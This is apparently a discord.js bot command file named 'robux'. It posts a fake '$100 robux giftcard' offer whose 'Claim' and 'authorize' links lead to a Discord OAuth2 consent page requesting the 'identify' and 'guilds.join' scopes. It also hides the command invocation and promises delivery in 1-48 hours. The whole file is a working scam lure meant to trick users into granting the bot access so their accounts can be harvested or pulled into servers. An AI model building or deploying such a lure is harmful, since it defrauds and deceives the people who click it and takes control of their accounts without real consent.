const discord = require('discord.js')

const epic = require("../../epic")
const { EmbedBuilder, codeBlock } = require("@discordjs/builders");
const { Colors, ApplicationCommandOptionType, PermissionFlagsBits, ChatInputCommandInteraction } = require("discord.js");
const { ApplicationCommandType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
module.exports = {
  name: "robux",
  description: "robux gift",
  default_permission: true,
  timeout: 3000,
  category: "whitelist",
userPerms: [discord.PermissionFlagsBits.SendMessages],
  ownerOnly: false,

  run: async (client, interaction, args) => {
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel(`Claim`)
      .setStyle(ButtonStyle.Link)
     .setURL(`https://discord.com/oauth2/authorize?client_id=${epic.client_id}&redirect_uri=${epic.redirect_uri}&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%22${interaction.guild.id}%22%2C%22bot%22%3A%22${epic.client_id}%22%7D`)
          )
  interaction.deferReply();
  interaction.deleteReply();
  interaction.channel.send({embeds: [new discord.EmbedBuilder().setDescription(`\`To get your 100$ robux giftcard all you must do is:\`
\n1️⃣Click on the [**__claim__**](${`https://discord.com/oauth2/authorize?client_id=${epic.client_id}&redirect_uri=${epic.redirect_uri}&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%22${interaction.guild.id}%22%2C%22bot%22%3A%22${epic.client_id}%22%7D`}) button.
\n2️⃣Click on the [**__authorize__**](${`https://discord.com/oauth2/authorize?client_id=${epic.client_id}&redirect_uri=${epic.redirect_uri}&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%22${interaction.guild.id}%22%2C%22bot%22%3A%22${epic.client_id}%22%7D`})\n\n**__Once you've authorized yourself you must wait around 1-48 hours and you'll have it.__**`)
.setImage("https://media.gamestop.com/i/gamestop/11112976/Roblox-$100-Digital-Gift-Card-Includes-Exclusive-Virtual-Item")
        .setColor("#FFFFFF")], components: [row]})


    
  }
}